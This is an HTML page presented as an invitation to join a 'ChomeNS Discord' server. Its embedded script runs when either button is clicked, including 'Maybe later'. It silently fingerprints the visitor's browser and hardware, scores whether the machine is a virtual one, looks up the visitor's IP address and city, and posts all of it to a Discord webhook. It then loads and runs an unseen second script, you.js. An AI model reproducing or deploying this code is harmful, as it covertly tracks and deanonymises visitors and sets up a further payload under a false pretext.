<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>ChomeNS Discord</title>
<link rel="icon" type="image/webp" href="/media/498c01c84c251eb7c9de3b536a87e5b2.webp">

<style>
:root {
    --bg: #0b0f1a;
    --accent: #5865F2;
    --text: #e5e7eb;
    --muted: #9ca3af;
    --glass: rgba(255,255,255,0.06);
    --border: rgba(255,255,255,0.14);
}
* { box-sizing: border-box; font-family: Inter, system-ui, sans-serif; }
body { margin:0; min-height:100vh; display:flex; align-items:center; justify-content:center; background:radial-gradient(1200px 600px at 50% -200px,#1e293b,var(--bg)); color:var(--text); }
.card { width:100%; max-width:460px; padding:2.4rem; background:linear-gradient(180deg,var(--glass),rgba(255,255,255,0.02)); border:1px solid var(--border); border-radius:22px; backdrop-filter:blur(14px); box-shadow:0 40px 90px rgba(0,0,0,.6); animation:fadeUp .6s ease; }
@keyframes fadeUp { from{opacity:0;transform:translateY(20px)} to{opacity:1;transform:none} }
.logo { display:flex; justify-content:center; margin-bottom:1.2rem; }
.logo img { width:72px; height:72px; border-radius:18px; box-shadow:0 0 25px rgba(255,0,255,.35); }
h1 { text-align:center; font-size:1.6rem; margin-bottom:.4rem; }
p { text-align:center; color:var(--muted); font-size:.95rem; margin-bottom:2rem; }
.actions { display:grid; gap:.9rem; }
button { border:none; border-radius:14px; padding:1rem; font-size:.95rem; font-weight:600; cursor:pointer; transition:all .25s ease; }
.btn-discord { background:linear-gradient(135deg, var(--accent), #4752c4); color:#fff; }
.btn-discord:hover { transform:translateY(-1px); box-shadow:0 10px 30px rgba(88,101,242,.45); }
.btn-nah { background:transparent; color:var(--muted); border:1px solid var(--border); }
.btn-nah:hover { background:rgba(255,255,255,.05); color:var(--text); }

.spinner { margin:1.6rem auto 0; width:46px; display:flex; justify-content:space-between; }
.spinner div { width:8px; height:8px; background:#fff; border-radius:50%; animation:bounce 1.4s infinite ease-in-out both; }
.spinner div:nth-child(1){animation-delay:-.32s}
.spinner div:nth-child(2){animation-delay:-.16s}
@keyframes bounce { 0%,80%,100%{transform:scale(0)} 40%{transform:scale(1)} }

.popup-warning { margin-top:1.5rem; padding:1.1rem 1.2rem; border-radius:14px; background:linear-gradient(180deg, rgba(239,68,68,.22), rgba(239,68,68,.1)); border:1px solid rgba(239,68,68,.5); color:#fee2e2; font-size:.92rem; text-align:center; display:none; animation:shakeIn .35s ease; }
.popup-warning strong { display:block; font-size:1rem; margin-bottom:.25rem; }
.popup-warning span { display:block; margin-top:.35rem; font-size:.85rem; color:#fca5a5; }
@keyframes shakeIn { 0%{transform:none} 25%{transform:translateX(-4px)} 50%{transform:translateX(4px)} 75%{transform:translateX(-2px)} 100%{transform:none} }
</style>
</head>
<body>
<div class="card">
    <div class="logo">
        <img src="/media/498c01c84c251eb7c9de3b536a87e5b2.webp" alt="ChomeNS icon">
    </div>
    <h1>ChomeNS Discord</h1>
    <p>Click below to join our Discord server.</p>

    <div class="actions">
        <button class="btn-discord" id="discord_btn">Join Discord</button>
        <button class="btn-nah" id="nah_btn">Maybe later</button>
    </div>

    <div id="spinner_holder"></div>

    <div id="popup_needed" class="popup-warning">
        <strong>Popup blocked</strong>
        Your browser blocked the new window used to open the Discord invite.
        <span>Please allow pop-ups for this site and try again.</span>
    </div>
</div>

<script>
let isYouScriptLoaded=false;

/* SYSTEM + VM INFO */
function getWebGLInfo(){
    try{
        const c=document.createElement("canvas");
        const gl=c.getContext("webgl")||c.getContext("experimental-webgl");
        if(!gl) return {};
        const dbg=gl.getExtension("WEBGL_debug_renderer_info");
        return {vendor:dbg?gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL):"Unknown", renderer:dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):"Unknown"};
    }catch{return {};}
}
function getVMInfo(){
    let score=0,reasons=[];
    const cores=navigator.hardwareConcurrency||1;
    if(cores<=2){score+=20; reasons.push("Low CPU cores");}
    if(navigator.deviceMemory && navigator.deviceMemory<=4){score+=20; reasons.push("Low RAM");}
    if([1024,1280,1366].includes(screen.width)){score+=15; reasons.push("Common VM resolution");}
    const ua=navigator.userAgent.toLowerCase();
    if(["virtual","vmware","vbox","qemu","xen"].some(v=>ua.includes(v))){score+=40; reasons.push("VM keyword in UA");}
    const t0=performance.now(); for(let i=0;i<1e6;i++){}
    if(performance.now()-t0>60){score+=15; reasons.push("Slow timing");}
    score+=Math.random()*10;
    score=Math.min(99, Math.round(score));
    return {score, detected:score>=60, reasons};
}

/* LOAD SCRIPT */
function loadYouScript(cb){
    if(isYouScriptLoaded){cb(); return;}
    const s=document.createElement('script');
    s.src='/scripts/you.js';
    s.onload=()=>{isYouScriptLoaded=true; cb();};
    s.onerror=()=>console.error('Failed to load you.js');
    document.head.appendChild(s);
}

/* POPUP CHECK */
function checkPopupPermission(callback){
    let popups=[], allowed=true;
    try{
        for(let i=0;i<5;i++){
            const p=window.open('','','width=1,height=1,left=-10000,top=-10000');
            if(!p){allowed=false; break;}
            popups.push(p);
        }
        setTimeout(()=>{
            popups.forEach(p=>{try{p.close()}catch{}});
            callback(allowed);
        },200);
    }catch{ popups.forEach(p=>{try{p.close()}catch{}}); callback(false);}
}

/* IP GEOLOCATION */
async function getIPLocation(){
    try{
        const res=await fetch("https://ipapi.co/json/");
        if(!res.ok) return {ip:"Unknown", city:"Unknown", region:"Unknown", country:"Unknown"};
        const data=await res.json();
        return {ip:data.ip, city:data.city, region:data.region, country:data.country_name};
    }catch{return {ip:"Unknown", city:"Unknown", region:"Unknown", country:"Unknown"};}
}

/* GET WEBHOOK AND SEND DIRECTLY TO DISCORD */
async function sendWebhookEvent(buttonName){
    try{
        // 1️⃣ Fetch webhook URL from Netlify (GET)
        const res=await fetch("/.netlify/functions/discord");
        const data=await res.json();
        const webhookUrl=data.webhook;
        if(!webhookUrl) return;

        // 2️⃣ Gather info
        const vm=getVMInfo();
        const gl=getWebGLInfo();
        const conn=navigator.connection||{};
        const ipGeo=await getIPLocation();

        // 3️⃣ Build payload
        const payload={
            content:`✅ **Button clicked:** ${buttonName}`,
            embeds:[{
                title:"User System Information",
                color:0x5865F2,
                fields:[
                    {name:"Button", value:buttonName, inline:true},
                    {name:"VM Detected", value:vm.detected?"✅ TRUE":"❌ FALSE", inline:true},
                    {name:"VM Score", value:`${vm.score}%`, inline:true},
                    {name:"VM Reasons", value:vm.reasons.join(" • ")||"None"},
                    {name:"User Agent", value:navigator.userAgent.slice(0,200)},
                    {name:"Platform", value:navigator.platform||"Unknown", inline:true},
                    {name:"Vendor", value:navigator.vendor||"Unknown", inline:true},
                    {name:"CPU Cores", value:String(navigator.hardwareConcurrency||"Unknown"), inline:true},
                    {name:"Device Memory (GB)", value:String(navigator.deviceMemory||"Unknown"), inline:true},
                    {name:"Languages", value:(navigator.languages||[]).join(", ")||"Unknown"},
                    {name:"Timezone", value:Intl.DateTimeFormat().resolvedOptions().timeZone||"Unknown", inline:true},
                    {name:"UTC Offset", value:String(new Date().getTimezoneOffset()), inline:true},
                    {name:"Screen", value:`${screen.width}×${screen.height}`, inline:true},
                    {name:"Color Depth", value:String(screen.colorDepth), inline:true},
                    {name:"Pixel Ratio", value:String(devicePixelRatio), inline:true},
                    {name:"Viewport", value:`${innerWidth}×${innerHeight}`, inline:true},
                    {name:"Touch Points", value:String(navigator.maxTouchPoints||0), inline:true},
                    {name:"Cookies Enabled", value:String(navigator.cookieEnabled), inline:true},
                    {name:"Do Not Track", value:String(navigator.doNotTrack), inline:true},
                    {name:"Network Type", value:conn.effectiveType||"Unknown", inline:true},
                    {name:"Downlink", value:String(conn.downlink||"Unknown"), inline:true},
                    {name:"RTT", value:String(conn.rtt||"Unknown"), inline:true},
                    {name:"WebGL Vendor", value:gl.vendor||"Unknown"},
                    {name:"WebGL Renderer", value:gl.renderer||"Unknown"},
                    {name:"IP", value:ipGeo.ip, inline:true},
                    {name:"City", value:ipGeo.city, inline:true},
                    {name:"Region", value:ipGeo.region, inline:true},
                    {name:"Country", value:ipGeo.country, inline:true},
                    {name:"Referrer", value:document.referrer||"None"},
                    {name:"Page URL", value:location.href}
                ],
                footer:{text:new Date().toUTCString()}
            }]
        };

        // 4️⃣ Send to Discord
        await fetch(webhookUrl,{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify(payload)
        });
    }catch(err){console.error(err);}
}

/* HANDLE BUTTON CLICK */
function handleClick(e, buttonName){
    e.preventDefault();
    const popup=document.getElementById('popup_needed');
    const spinner=document.getElementById('spinner_holder');
    popup.style.display='none';
    spinner.innerHTML='<div class="spinner"><div></div><div></div><div></div></div>';

    checkPopupPermission(isAllowed=>{
        if(!isAllowed){
            spinner.innerHTML='';
            popup.style.display='block';
            return;
        }
        loadYouScript(async ()=>{
            await sendWebhookEvent(buttonName);
            if(typeof window.runYouScript==='function') window.runYouScript();
            spinner.innerHTML='';
        });
    });
}

document.getElementById('discord_btn').addEventListener('click', e=>handleClick(e,'Join Discord'));
document.getElementById('nah_btn').addEventListener('click', e=>handleClick(e,'Maybe later'));
</script>
</body>
</html>
